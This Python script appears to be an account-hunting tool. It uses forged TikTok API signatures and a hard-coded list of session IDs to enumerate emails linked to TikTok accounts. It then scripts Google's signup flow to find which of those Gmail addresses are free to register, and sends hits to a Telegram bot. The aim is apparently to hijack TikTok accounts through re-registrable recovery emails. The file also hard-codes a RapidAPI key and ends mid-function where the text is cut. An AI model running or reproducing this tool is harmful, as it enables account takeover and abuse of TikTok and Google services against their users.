from requests import get,post as pp,Session;from urllib.parse import urlencode;import http.client,os,re,random,string,sys,time,uuid,binascii,json;from random import choice as cc,randrange as rr,randint;from time import sleep,time;import httpx;from user_agent import generate_user_agent as ggb;import telebot;from telebot import types;from uuid import uuid4;import secrets;from datetime import datetime;from bs4 import BeautifulSoup;from ms4 import InfoTik;from cfonts import render,say;from MedoSigner import Argus,Gorgon,md5,Ladon;from concurrent.futures import ThreadPoolExecutor;from threading import Thread;import binascii;import webbrowser
E='\033[1;31m'
Y='\033[1;33m'
Z='\033[1;31m'
X='\033[1;33m'
Z1='\033[2;31m'
F='\033[2;32m'
A='\033[2;34m'
C='\033[2;35m'
S='\033[2;36m'
G='\033[1;34m'
HH='\033[1;34m'
M='\x1b[1;37m'
from requests import get,post
try:
  from urllib.parse import urlencode
except:
  os.system('pip install pycryptodome')
try:
  import MedoSigner
except:
  os.system('pip install MedoSigner')
from random import choice,randrange
import http.client
import requests
import re
from time import sleep,time
from user_agent import generate_user_agent
from random import choice,randrange
import os,re
import requests 
try:
	import telebot 
except:
	os.system('pip install telebot')
	os.system('pip install Pytelegrambotapi==3.7.7')
	os.system('clear')
	import telebot
from telebot import types
from uuid import uuid4
import random
from re import *
import json
from user_agent import generate_user_agent
import sys
from datetime import datetime
from bs4 import BeautifulSoup
import datetime
import secrets
import uuid
import binascii,sys
import secrets
try:
	import binascii
except:
	os.system('pip install binascii')
from concurrent.futures import ThreadPoolExecutor
import string
import threading
import time
from requests import get,post as pp,Session;from urllib.parse import urlencode;import http.client,os,re,random,string,sys,time,uuid,binascii,json;from random import choice as cc,randrange as rr,randint;from time import sleep,time;import httpx;from user_agent import generate_user_agent as ggb;import telebot;from telebot import types;from uuid import uuid4;import secrets;from datetime import datetime;from bs4 import BeautifulSoup;from ms4 import InfoTik;from cfonts import render,say;from MedoSigner import Argus,Gorgon,md5,Ladon;from concurrent.futures import ThreadPoolExecutor;from threading import Thread;import binascii;import webbrowser
E='\033[1;31m';Y='\033[1;33m';Z='\033[1;31m';X='\033[1;33m';Z1='\033[2;31m';F='\033[2;32m';A='\033[2;34m';C='\033[2;35m';S='\033[2;36m';G='\033[1;34m';HH='\033[1;34m';M='\x1b[1;37m'
hit,ge,be,gt,bt=0,0,0,0,0
import os

import time
import sys

eizon_header = render('Tiktok', colors=['white', 'red'], align='center')
print("\x1b[1;36m" + "â" * 67)
print(eizon_header)
print("ððð¯ : @BatuX28 ")
print("â" * 67)
def slow_print(text, delay=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()  # SatÄ±r atla

print("\033[1;36m\nââââââââââââââââââââââââââ")
print("   ð  ï¼©ï¼¤  ï¼§ï¼©ï¼²ï¼©ï¼®ï¼©ï¼º")
print("ââââââââââââââââââââââââââ\033[0m")
iid = input("\033[1;33mâ¡ï¸  ï¼©ï¼¤ : \033[0m")

print("\033[1;36m\nââââââââââââââââââââââââââ")
print("   ð  ï¼´ï¼¯ï¼«ï¼¥ï¼®  ï¼§ï¼©ï¼²ï¼©ï¼®ï¼©ï¼º")
print("ââââââââââââââââââââââââââ\033[0m")
tok = input("\033[1;33mâ¡ï¸  ï¼´ï¼¯ï¼«ï¼¥ï¼® : \033[0m")

slow_print("\033[1;32m\nâ ï¼¢ï½ï½ï½ï½ï½ï½ï½ ï½ï½ï½ï½ï½ï½ï¼ ï¼¢ï½ï½ ï½ï½ï½ï½ï½ï½ï½ï½ï½ï½ï½ï½...\033[0m", 0.05)
time.sleep(1)

os.system('clear')


def luffy_info(email):
  global hit,iid,tok
  hit+=1
  email=str(email)
  user = email.split('@')[0]
  try:
    he={'X-RapidAPI-Host':'tiktok-video-no-watermark2.p.rapidapi.com','X-RapidAPI-Key':'54eb4910e1msh0b7d1211a1be475p12c3aejsnd55f85d359f3','Host':'tiktok-video-no-watermark2.p.rapidapi.com','Connection':'Keep-Alive','Accept-Encoding':'gzip','User-Agent':'okhttp/3.14.7'} 
    url=f'https://tiktok-video-no-watermark2.p.rapidapi.com/user/info?unique_id={user}&user_id='
    r=requests.get(url,headers=he).json()
    id = r['data']['user']['id']
    user = user  
    name=r['data']['user']['nickname']
    folon = r['data']['stats']['followingCount']
    folos = r['data']['stats']['followerCount']
    lik =  r['data']['stats']['heartCount']
    vid = r['data']['stats']['videoCount']
    priv = r['data']['user']['privateAccount']    
    ff = (f'''
âââââââââââââââââââââââ
ð¥ð  ð¡ððª ð§ððð§ð¢ð ððð§  ðð¥
âââââââââââââââââââââââ
ð¯ ðð¢ð­ : â¨ {hit} â¨  
ð¤ ðð¬ðð«ð§ðð¦ð : @{user}  
ð§ ðð¦ðð¢ð¥ : âï¸ {email}@gmail.com  
ð¥ ðð¨ð¥ð¥ð¨ð°ðð«ð¬ : ð {followers}  
ð ðð¨ð¥ð¥ð¨ð°ð¢ð§ð  : ð¥ {following}  
âââââââââââââââââââââââ
ð  ð§ð¼ð¼ð¹ ðð : @BatuX28 ð 
âââââââââââââââââââââââ
   ''') 
    requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(ff))
    print(ff)
  except:
    ff = (f'''
âââââââââââââââââââââââ
ð¥ð  ð¡ððª ð§ððð§ð¢ð ððð§  ðð¥
âââââââââââââââââââââââ
ð¯ ðð¢ð­ : â¨ {hit} â¨  
ð¤ ðð¬ðð«ð§ðð¦ð : @{user}  
ð§ ðð¦ðð¢ð¥ : âï¸ {email}@gmail.com  
ð¥ ðð¨ð¥ð¥ð¨ð°ðð«ð¬ : ð {followers}  
ð ðð¨ð¥ð¥ð¨ð°ð¢ð§ð  : ð¥ {following}  
âââââââââââââââââââââââ
ð  ð§ð¼ð¼ð¹ ðð : @BatuX28 ð 
âââââââââââââââââââââââ
   ''') 
    requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(ff))
    print(ff)
    
    
    
def vip_gmail(email):
    global hit,ge,be,gt,bt
    if '@' in email:email=email.split('@')[0]
    if '..' in email or '_' in email or len(email) < 5 or len(email) > 30:
        return False
    name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(5,10)))
    birthday = random.randrange(1980,2010),random.randrange(1,12),random.randrange(1,28)
    s = requests.Session()
    headers={'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language':'en-US,en;q=0.9','referer':'https://accounts.google.com/','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','x-browser-channel':'stable','x-browser-copyright':'Copyright 2024 Google LLC. All rights reserved.','x-browser-year':'2024'}
    params={'biz':'false','continue':'https://mail.google.com/mail/u/0/','ddm':'1','emr':'1','flowEntry':'SignUp','flowName':'GlifWebSignIn','followup':'https://mail.google.com/mail/u/0/','osid':'1','service':'mail'}
    response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
    tl=response.url.split('TL=')[1]
    s1= response.text.split('"Qzxixc":"')[1].split('"')[0]
    at = response.text.split('"SNlM0e":"')[1].split('"')[0]
    headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','origin':'https://accounts.google.com','referer':'https://accounts.google.com/','user-agent':'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','x-goog-ext-278367001-jspb':'["GlifWebSignIn"]','x-goog-ext-391502476-jspb':f'["{s1}"]','x-same-domain':'1'}
    params={'rpcids':'E815hb','source-path':'/lifecycle/steps/signup/name','hl':'en-US','TL':tl,'rt':'c'}
    data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)
    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers, 
        data=data,
    ).text
    headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','origin':'https://accounts.google.com','referer':'https://accounts.google.com/','user-agent':'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','x-goog-ext-278367001-jspb':'["GlifWebSignIn"]','x-goog-ext-391502476-jspb':f'["{s1}"]','x-same-domain':'1'}
    params={'rpcids':'eOY7Bb','source-path':'/lifecycle/steps/signup/birthdaygender','hl':'en-US','TL':tl,'rt':'c'}
    data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(birthday[0],birthday[1],birthday[2],at)
    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text 
    headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','origin':'https://accounts.google.com','referer':'https://accounts.google.com/','user-agent':'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','x-goog-ext-278367001-jspb':'["GlifWebSignIn"]','x-goog-ext-391502476-jspb':'["'+s1+'"]','x-same-domain':'1'}
    params={'rpcids':'NHJMOd','source-path':'/lifecycle/steps/signup/username','hl':'en-US','TL':tl,'rt':'c'}
    data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)
    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text 
    if "password"in response:
        luffy_info(email)
        os.system('cls'if os.name=="nt"else"clear")
        ge+=1
        print(f"\r{F}ð ð§ð¥ð¨ð : {G}[{ge}]  {F}â â ï¸ ððððð¦ : {Z}[{bt}]  {F}â â ððð ð ððð : {X}[{be}] {HH}", end="\r") 
    else:
        os.system('cls'if os.name=="nt"else"clear")
        be+=1
        print(f"\r{F}ð ð§ð¥ð¨ð : {G}[{ge}]  {F}â â ï¸ ððððð¦ : {Z}[{bt}]  {F}â â ððð ð ððð : {X}[{be}] {HH}", end="\r")  

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload is not None else None
    if not unix:
        unix = int(time())
    return Gorgon(params, unix, payload, cookie).get_value() | {
        "x-ladon": Ladon.encrypt(unix, license_id, aid),
        "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
    }


 

        
def vip_priv(email):
    global a, hit, ge, be, gt, bt
    try:
        secret = secrets.token_hex(16)
        session = requests.Session()
        new_uuid = str(uuid.uuid4()).replace('-', '')   
        sid_tt = f"sid_tt={new_uuid[:16]}; "        
        session_id = [
    "6fafac5afcb5724d51adac7257c755d5",
    "a3f2e97cdb7a0249bb2b05c3135dc352",
    "c4fa59b59ece70395023afe78baa5d8a",
    "10266e7806fa0c9ffbf57f85d92554a5",
    "36144c9f68b6eb8aefb501a6a31e8118",
    "effd6e10b6ff30e22e58d0fcf62b1a54",
    "ccbe4b0c894f0d4c1e5c679f07287b3b",
    "c444837e6ccd3a101602422e9d3c3252",
    "cb74967182ec687b9fc0435bc4fcae89",
    "21953b31d25e7b508e8c64c24f48a108",
    "d6f15330d120a8c57da6570a5aab4d5f",
    "1b3360c5cec4c44457b8813cb9536e45",
    "3df46a118be3401707d30327a8858d74",
    "656dc86e8435331e87b036752448db68",
    "900b6e7958a805f3113f317b938c1ebb",
    "a147960a734ce913251d91e75bd41de2",
    "263610f531b715adfb34d26567e9b6f3",
    "d34eb6de48c0882c6e5a02a2bc968081",
    "8d44cffc73b15c8998849d6de27a9301",
    "b6fde9cea09ad4be89b9121b7f1a7a04",
    "9edada27bfcec7e8a1ff649beea19c76",
    "eb6f87992a7a7d8367fb851e1dd76500",
    "d970a8983309d51a02ae666db230cfd3",
    "1926dd91277c79633c4cde74ecf5182e",
    "858d71df61a2c92d0994aa2faeb43a3a",
    "d64af91724d38f7bc73b3fef0fca8db9",
    "20b2f37bbcf5595b9d3a513df868f10a",
    "73a38762633252801cc48c7ce96b126a",
    "8ded08b5a2f7c138f82ef19bff62b014",
    "08fb9b8270b8885efcd6348821a3b595",
    "01a268b5490b71262326329776e67e42",
    "bcbe07458dd7cb6bcf41da270fc7eec8",
    "411e81b194f15a563dbb4fe749159e4c",
    "9c3901e64f0920e9f0efd8dcbb09c9af",
    "1a4bdfb7776f6734298f4c9075d2a418",
    "0138e069e8fe6c8b07e1a0db9038a332",
    "2d9940d16376dee30d53112f55a15136",
    "79df8cf143d9b590438926e152b72b66",
    "aafcba353ff35b0031746c72682aaca2",
    "253df8db339722da6f57a1c4716d0a80",
    "9dea2180a9e6edf163a18f9f0420496c",
    "7d8d649fcedb63b2c5569f73efa0a467",
    "ab10d6d678a0d48de5bd51f16009b4d8",
    "87e11bed392b70782e58dec0370d8447",
    "1d3f912a6800fbdf69a3fc383ce5ee58",
    "93d69013bc71583716e497c7fc17ca27",
    "f250acc8b1e5d5f92ee8be3699fd6536",
    "b2aecd030b057c45366dad00cefecd7d",
    "397b55bf37255ac26ab79739f4926217",
    "adb8192a6804581c08329f398cb51917",
    "4b4c3c47cbdd5bd38202403125091a51",
    "cebfd14176c6c6bc3bb12f772a69e25a",
    "9e71174495cc2c9ff6674b29233305ff",
    "f9044bb2a34f86a45b45171e0a92ef6d",
    "7eaf14e5025e5bdcf326b6e7ecb70f03",
    "141135fe78ef664cc429755eaf20c373",
    "cac437b128dbe68afbd33d0e80e56483",
    "36a704a0ee788e83c547efd31eea3846",
    "0e3dd0aca3cab9de1edd01492d849ac5",
    "632b6cab67509bbfe17c0db9e49617d8",
    "3da2d6bf1244a551584ece7abb95622a",
    "0064350770d0ccca2ab54a379b8ba9bf",
    "b25614823870dcfcba6fdef6e72af5d1",
    "29e5a771a6b47b114b75af600e290edd",
    "e410b62db135a6e953714b2405808e97",
    "fca9734feeec2910a19ef9dd57d8426a",
    "7298c225f1bb7025e2c74b3146e8e497",
    "e241d3a0e00fdec3033dc0392de3ccb7",
    "933971325e12e7fbea84c48bb5e31142",
    "7772b65eaf8af91e68b40b6faed360cb",
    "b51f36b2cefac35c1847bb1631113588",
    "a376eb74de92c39e43114c740490477d",
    "f466e8e3e2f43915db01ae6efbcf5e7b",
    "32ace4984ce8e910fdb958cf55f01c40",
    "5325618720103e7987ac8e1eb7777f79",
    "c563af7e7ffd63bf083e1f18d78dfb0d",
    "10dbf33f0e7fb2da2efd8231558909ad",
    "44f37d99726fc9895b947db8e822469f",
    "eeb95e2378303763df06c3a40a5f3a95",
    "d1f04b25c4b563f0251f8050c39d2d1b",
    "30f8ff14e3d5c84f88a1f58d50c59105",
    "38aaed508a79801f2b815755d57efe9a",
    "c3058b76be0aba378b47697c535eb916"
]
        sessionid = random.choice(session_id)
        cookies={"passport_csrf_token":secret,"passport_csrf_token_default":secret,"sessionid":sessionid}      
        session.cookies.update(cookies)
        params={'passport-sdk-version':"6030790",'iid':str(random.randint(1,10**19)),'device_id':str(random.randint(1,10**19)),'ac':"WIFI",'channel':"googleplay",'aid':"1233",'app_name':"musical_ly",'version_code':"360505",'version_name':"36.5.5",'device_platform':"android",'os':"android"}
        mkk = sign(params=urlencode(params), payload="", cookie="")
        headers={'User-Agent':'com.zhiliaoapp.musically/2023208030(Linux;U;Android9;en;G011A;Build/PI;tt-ok/3.12.13.4-tiktok)','x-tt-passport-csrf-token':secret,'content-type':"application/x-www-form-urlencoded;charset=UTF-8",'x-argus':mkk["x-argus"],'x-gorgon':mkk["x-gorgon"],'x-khronos':mkk["x-khronos"],'x-ladon':mkk["x-ladon"]}
        response = session.post("https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/", params=params, headers=headers, data={"email": email})
        if "Email is linked to another account. Unlink or try another email" in response.text:
            vip_gmail(email)
            print(response.text)
            os.system('cls' if os.name == 'nt' else 'clear')
            gt += 1
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            bt += 1
            print(f"\r{F}ð ð§ð¥ð¨ð : {G}[{ge}]  {F}â â ï¸ ððððð¦ : {Z}[{bt}]  {F}â â ððð ð ððð : {X}[{be}] {HH}", end="\r")
    except ValueError:
        print("")
    except requests.RequestException as e:
        print(f"")  
        
        
        

               
                
                 
                   
def luffy_shelby():
        while True:
            try:
                g=choice(
            [
                'azertyuiopmlkjhgfdsqwxcvbn', 
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzÃ©Ã¨ÃªÃ«Ã Ã¢Ã¤Ã´Ã¹Ã»Ã¼Ã®Ã¯Ã§',  
                'abcdefghijklmnopqrstuvwxyzÃ©Ã¨ÃªÃ«Ã Ã¢Ã¤Ã´Ã¹Ã»Ã¼Ã®Ã¯Ã§',
                'abcdefghijklmnopqrstuvwxyzÃ©Ã¨ÃªÃ«Ã Ã¢Ã¤Ã´Ã¹Ã»Ã¼Ã®Ã¯Ã§',
                'abcdefghijklmnopqrstuvwxyzÃ±',  
                'abcdefghijklmnopqrstuvwxyzÃ±',
                'abcdefghijklmnopqrstuvwxyzÃ±',
                'Ð°Ð±Ð²Ð³Ð´ÐµÑÐ¶Ð·Ð¸Ð¹ÐºÐ»Ð¼Ð½Ð¾Ð¿ÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑ',  
                'Ð°Ð±Ð²Ð³Ð´ÐµÑÐ¶Ð·Ð¸Ð¹ÐºÐ»Ð¼Ð½Ð¾Ð¿ÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑ',
                'Ð°Ð±Ð²Ð³Ð´ÐµÑÐ¶Ð·Ð¸Ð¹ÐºÐ»Ð¼Ð½Ð¾Ð¿ÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑ',
                'çä¸æ¯ä¸äºäººæå¨æä»è¿ä¸ºä¹å¤§æ¥ä»¥ä¸ªä¸­ä¸ä»¬å°è¯´æ¶å½åå°è¦å°±åºä¼å¯ä¹ä½ å¯¹çè½èå­é£å¾äºçä¸èªä¹',  
                'çä¸æ¯ä¸äºäººæå¨æä»è¿ä¸ºä¹å¤§æ¥ä»¥ä¸ªä¸­ä¸ä»¬å°è¯´æ¶å½åå°è¦å°±åºä¼å¯ä¹ä½ å¯¹çè½èå­é£å¾äºçä¸èªä¹',
                'çä¸æ¯ä¸äºäººæå¨æä»è¿ä¸ºä¹å¤§æ¥ä»¥ä¸ªä¸­ä¸ä»¬å°è¯´æ¶å½åå°è¦å°±åºä¼å¯ä¹ä½ å¯¹çè½èå­é£å¾äºçä¸èªä¹',
                'ã¢ã¤ã¦ã¨ãªã«ã­ã¯ã±ã³ãµã·ã¹ã»ã½ã¿ããããããããããããããããã ã¡ã¢ã¤ã¦ã¨ã©ãªã«ã¬ã­ã¯ã²ã³',  
                'ã¢ã¤ã¦ã¨ãªã«ã­ã¯ã±ã³ãµã·ã¹ã»ã½ã¿ããããããããããããããããã ã¡ã¢ã¤ã¦ã¨ã©ãªã«ã¬ã­ã¯ã²ã³',
                'ããããããããããããããããã¡ã¤ã¦ã¨ãªã«ã¬ã­ã®ã¯ã²ãµã¸ã»ã¾ã¿ãããããããããããããã', 
                'ããããããããããããããããã¡ã¤ã¦ã¨ãªã«ã¬ã­ã®ã¯ã²ãµã¸ã»ã¾ã¿ãããããããããããããã',
                '×××××××××××××× ×¡×¢×¤×¦×§×¨×©×ª',
                '×××××××××××××× ×¡×¢×¤×¦×§×¨×©×ª',
                'Ø¯Ø¬Ø­Ø®ÙØ¹ØºÙÙØ«ØµØ¶Ø´Ø³ÙØ¨ÙØ§ØªÙÙÙØ·Ø¸Ø²ÙØ©ÙØ§Ø±Ø¤Ø¡Ø¦',
                'Ø¯Ø¬Ø­Ø®ÙØ¹ØºÙÙØ«ØµØ¶Ø´Ø³ÙØ¨ÙØ§ØªÙÙÙØ·Ø¸Ø²ÙØ©ÙØ§Ø±Ø¤Ø¡Ø¦',
                'Î±Î²Î³Î´ÎµÎ¶Î·Î¸Î¹ÎºÎ»Î¼Î½Î¾Î¿ÏÏÏÏÏÏÏÏÏ',  
                'Î±Î²Î³Î´ÎµÎ¶Î·Î¸Î¹ÎºÎ»Î¼Î½Î¾Î¿ÏÏÏÏÏÏÏÏÏ',
                'abcdefghijklmnopqrstuvwxyzÃ§', 
                'abcdefghijklmnopqrstuvwxyzÃ§',
                'à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸ à¸¡à¸¢à¸£à¸¤à¸¤à¸¥à¸¦à¸§à¸¨à¸©à¸ªà¸«à¸¬à¸­à¸®',  
                'à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸à¸ à¸¡à¸¢à¸£à¸¤à¸¤à¸¥à¸¦à¸§à¸¨à¸©à¸ªà¸«à¸¬à¸­à¸®',
                'à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤ à¤¡à¤¢à¤£à¤¤à¤¥à¤¦à¤§à¤¨à¤ªà¤«à¤¬à¤­à¤®à¤¯à¤°à¤²à¤µà¤¶à¤·à¤¸à¤¹à¤à¥à¤·à¤¤à¥à¤°à¤à¥à¤',  
                'à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤à¤ à¤¡à¤¢à¤£à¤¤à¤¥à¤¦à¤§à¤¨à¤ªà¤«à¤¬à¤­à¤®à¤¯à¤°à¤²à¤µà¤¶à¤·à¤¸à¤¹à¤à¥à¤·à¤¤à¥à¤°à¤à¥à¤',
            ]

        )

                keyword=''.join((choice(g) for i in range(randrange(4,9))))
                idd6= "".join(random.choice('1234567890')for i in range(19))
               
                he3 = {"User-Agent": f'com.zhiliaoapp.musically/{keyword} (Linux; U; Android {randrange(7,13)}; ar_IQ_#u-nu-latn; ANY-LX2; Build/{keyword}; Cronet/58.0.{randrange(3,9)}.0)'}
                ttwid=requests.get('https://www.tiktok.com/',headers=he3).cookies.get_dict()['ttwid']
